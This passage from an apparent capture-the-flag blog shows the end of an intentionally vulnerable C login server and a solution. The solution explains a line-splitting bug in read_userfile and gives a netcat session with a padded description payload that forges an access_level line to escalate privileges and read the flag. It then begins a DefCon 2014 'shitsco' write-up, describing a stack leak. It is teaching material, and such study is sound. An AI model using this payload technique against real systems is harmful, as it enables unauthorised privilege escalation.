</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">hash_password</span><span class="p">(</span><span class="n">params</span><span class="p">)</span> <span class="o">==</span> <span class="n">ud</span><span class="o">-&gt;</span><span class="n">hash</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;login ok</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">logged_in</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you accidentially mistyped your password, please try again</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;register&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">params</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;missing arguments</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="kt">char</span> <span class="o">*</span><span class="n">pass</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="sc">&#39;:&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pass</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;missing password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="o">*</span><span class="n">pass</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span><span class='line'>      <span class="n">pass</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">pass</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;password too short</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open_userfile</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_EXCL</span><span class="o">|</span><span class="n">O_CREAT</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;unable to create user: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">strcpy</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">params</span><span class="p">);</span>
</span><span class='line'>      <span class="n">ud</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">ud</span><span class="p">));</span>
</span><span class='line'>      <span class="n">logged_in</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span><span class='line'>      <span class="n">ud</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">=</span> <span class="n">hash_password</span><span class="p">(</span><span class="n">pass</span><span class="p">);</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;user created successfully</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">logged_in</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you&#39;re not even logged in, how could you log out?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="n">logged_in</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span><span class='line'>      <span class="n">write_userfile</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">ud</span><span class="p">);</span>
</span><span class='line'>      <span class="o">*</span><span class="n">username</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">ud</span><span class="p">);</span> <span class="n">ud</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Uh, who are you again? I have forgotten.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;whois&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">logged_in</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you must be logged in for this</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">params</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;missing username&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="n">ud_</span> <span class="o">=</span> <span class="n">read_userfile</span><span class="p">(</span><span class="n">params</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ud_</span><span class="p">)</span> <span class="p">{</span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;unable to read userdata&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">ud_</span><span class="o">-&gt;</span><span class="n">access_level</span> <span class="o">&gt;=</span> <span class="n">ud</span><span class="o">-&gt;</span><span class="n">access_level</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;your access level is too low. sending bandit team to your location.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">free</span><span class="p">(</span><span class="n">ud_</span><span class="p">);</span>
</span><span class='line'>        <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;user</span><span class="se">\t</span><span class="s">%s</span><span class="se">\n</span><span class="s">level</span><span class="se">\t</span><span class="s">%u</span><span class="se">\n</span><span class="s">descr</span><span class="se">\t\&quot;</span><span class="s">%s</span><span class="se">\&quot;\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">params</span><span class="p">,</span> <span class="n">ud_</span><span class="o">-&gt;</span><span class="n">access_level</span><span class="p">,</span> <span class="n">ud_</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">);</span>
</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">ud_</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;levelup&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">logged_in</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you must be logged in for this</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">params</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;missing username&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="n">ud_</span> <span class="o">=</span> <span class="n">read_userfile</span><span class="p">(</span><span class="n">params</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ud_</span><span class="p">)</span> <span class="p">{</span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;unable to read userdata&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">ud_</span><span class="o">-&gt;</span><span class="n">access_level</span> <span class="o">&gt;=</span> <span class="n">ud</span><span class="o">-&gt;</span><span class="n">access_level</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;your access level is too low for that! sending bandit team to your location.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">free</span><span class="p">(</span><span class="n">ud_</span><span class="p">);</span>
</span><span class='line'>        <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">ud_</span><span class="o">-&gt;</span><span class="n">access_level</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="n">write_userfile</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="n">ud_</span><span class="p">);</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;user promoted to level %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ud_</span><span class="o">-&gt;</span><span class="n">access_level</span><span class="p">);</span>
</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">ud_</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&quot;set_description&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">logged_in</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you must be logged in for this</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">params</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;missing description</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="n">strcpy</span><span class="p">(</span><span class="n">ud</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">,</span> <span class="n">params</span><span class="p">);</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;description set</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;unknown command</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">perror</span><span class="p">(</span><span class="s">&quot;unable to create server socket&quot;</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_in6</span> <span class="n">bind_addr</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>    <span class="p">.</span><span class="n">sin6_family</span> <span class="o">=</span> <span class="n">AF_INET6</span><span class="p">,</span>
</span><span class='line'>    <span class="p">.</span><span class="n">sin6_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">1410</span><span class="p">)</span>
</span><span class='line'>  <span class="p">};</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">bind_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bind_addr</span><span class="p">)))</span> <span class="n">perror</span><span class="p">(</span><span class="s">&quot;unable to bind socket&quot;</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">))</span> <span class="n">perror</span><span class="p">(</span><span class="s">&quot;deaf&quot;</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">s_</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">s_</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">perror</span><span class="p">(</span><span class="s">&quot;accept failed, is this bad?&quot;</span><span class="p">);</span> <span class="cm">/* On Error Resume Next */</span>
</span><span class='line'>      <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">pid_t</span> <span class="n">child_pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">child_pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">perror</span><span class="p">(</span><span class="s">&quot;can&#39;t fork! that&#39;s bad, I think.&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">close</span><span class="p">(</span><span class="n">s_</span><span class="p">);</span>
</span><span class='line'>      <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>      <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">child_pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="n">close</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">handle</span><span class="p">(</span><span class="n">s_</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="n">close</span><span class="p">(</span><span class="n">s_</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Solution</h2>

<p>The <code>read_userfile()</code> function reads lines 256 bytes at a time.  However, when
writing the file you can write descriptions close to 512 bytes.  This allows you
to write long lines that will be treated as two lines by <code>read_userfile()</code>.
Since the original <code>access_level=0</code> line is written before the description, an
additional line can overwrite the <code>access_level</code> variable.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'> <span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="nf">read_userfile</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="n">res</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">res</span><span class="p">));</span>
</span><span class='line'>   <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>   <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open_userfile</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>   <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>   <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fdopen</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
</span><span class='line'>   <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>   <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>   <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">f</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>     <span class="n">rtrim</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
</span><span class='line'>     <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="n">line</span><span class="p">;</span>
</span><span class='line'>     <span class="kt">char</span> <span class="o">*</span><span class="n">eqsign</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;=&#39;</span><span class="p">);</span>
</span><span class='line'>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">eqsign</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>     <span class="o">*</span><span class="n">eqsign</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span><span class='line'>     <span class="kt">char</span> <span class="o">*</span><span class="n">value</span> <span class="o">=</span> <span class="n">eqsign</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;hash&quot;</span><span class="p">))</span> <span class="n">res</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">=</span> <span class="n">atoll</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
</span><span class='line'>     <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;access_level&quot;</span><span class="p">))</span> <span class="n">res</span><span class="o">-&gt;</span><span class="n">access_level</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
</span><span class='line'>     <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;description&quot;</span><span class="p">))</span> <span class="n">strcpy</span><span class="p">(</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
</span><span class='line'>     <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fatal error: bad key </span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s"> in config, aborting</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>   <span class="p">}</span>
</span><span class='line'>   <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
</span><span class='line'> <span class="p">}</span>
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">nc</span> <span class="n">wildwildweb</span><span class="p">.</span><span class="n">fluxfingers</span><span class="p">.</span><span class="n">net</span> <span class="mi">1410</span>
</span><span class='line'><span class="o">&gt;</span> <span class="k">register</span> <span class="n">test</span><span class="o">:</span><span class="n">password</span>
</span><span class='line'><span class="n">user</span> <span class="n">created</span> <span class="n">successfully</span>
</span><span class='line'><span class="o">&gt;</span> <span class="n">set_description</span>  <span class="n">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span> <span class="n">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaccess_level</span><span class="o">=</span><span class="mi">50</span>
</span><span class='line'><span class="n">description</span> <span class="n">set</span>
</span><span class='line'><span class="o">&gt;</span> <span class="n">logout</span>
</span><span class='line'><span class="n">Uh</span><span class="p">,</span> <span class="n">who</span> <span class="n">are</span> <span class="n">you</span> <span class="n">again</span><span class="o">?</span> <span class="n">I</span> <span class="n">have</span> <span class="n">forgotten</span><span class="p">.</span>
</span><span class='line'><span class="o">&gt;</span> <span class="n">user</span> <span class="n">test</span>
</span><span class='line'><span class="n">username</span> <span class="n">accepted</span><span class="p">,</span> <span class="n">please</span> <span class="n">provide</span> <span class="n">password</span>
</span><span class='line'><span class="o">&gt;</span> <span class="n">pass</span> <span class="n">password</span>
</span><span class='line'><span class="n">login</span> <span class="n">ok</span>
</span><span class='line'><span class="o">&gt;</span> <span class="n">whois</span> <span class="n">boss</span>
</span><span class='line'><span class="n">user</span>  <span class="n">boss</span>
</span><span class='line'><span class="n">level</span>  <span class="mi">10</span>
</span><span class='line'><span class="n">descr</span>  <span class="s">&quot;flag{this_is_why_gets_is_better_than_fgets}&quot;</span>
</span><span class='line'><span class="o">&gt;</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefCon Quals 2014 - shitsco]]></title>
    <link href="http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-shitsco/"/>
    <updated>2014-05-23T14:10:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-shitsco</id>
    <content type="html"><![CDATA[<h2>Analysis</h2>

<p>We are basically provided with a Cisco IOS-like CLI:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:/home/shitsco<span class="nv">$ </span>~/Desktop/shitsco_c8b1aa31679e945ee64bde1bdb19d035
</span><span class='line'>
</span><span class='line'> oooooooo8 oooo        o88    o8
</span><span class='line'>888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
</span><span class='line'> 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
</span><span class='line'>        888 888   888   888  888           888 888         888     888
</span><span class='line'>o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88
</span><span class='line'>
</span><span class='line'>Welcome to Shitsco Internet Operating System <span class="o">(</span>IOS<span class="o">)</span>
</span><span class='line'>For a <span class="nb">command </span>list, enter ?
</span><span class='line'><span class="nv">$ </span>?
</span><span class='line'><span class="o">==========</span>Available <span class="nv">Commands</span><span class="o">==========</span>
</span><span class='line'>|enable                               |
</span><span class='line'>|ping                                 |
</span><span class='line'>|tracert                              |
</span><span class='line'>|?                                    |
</span><span class='line'>|shell                                |
</span><span class='line'>|set                                  |
</span><span class='line'>|show                                 |
</span><span class='line'>|credits                              |
</span><span class='line'>|quit                                 |
</span><span class='line'><span class="o">======================================</span>
</span><span class='line'>Type ? followed by a <span class="nb">command </span><span class="k">for </span>more detailed information
</span><span class='line'><span class="nv">$ </span>? <span class="nb">enable</span>
</span><span class='line'><span class="nb">enable</span>: Enables administrator access, with the correct password.
</span><span class='line'><span class="nv">$ </span><span class="nb">enable </span>cisco
</span><span class='line'>Nope.  The password isn<span class="s1">&#39;t cisco</span>
</span><span class='line'><span class="s1">$ enable</span>
</span><span class='line'><span class="s1">Please enter a password: cisco</span>
</span><span class='line'><span class="s1">Nope.  The password isn&#39;</span>t ciscp�
</span></code></pre></td></tr></table></div></figure>

<p>After spending some time reversing and playing on the CLI, a few key points:</p>

<ul>
<li>in enable mode, you can run a command to print the flag (stored in file on disk)</li>
<li>to get into enable mode you need to know the password (stored on disk and read into a global variable)</li>
<li>there is a global boolean for whether you are in enable mode or not</li>
<li>you can get a leak of the stack when you type &#8216;enable&#8217; without a password and let it ask you. if you password is 5+ chars, you&#8217;ll notice some data leaked</li>
</ul>

<h2>Reversing</h2>

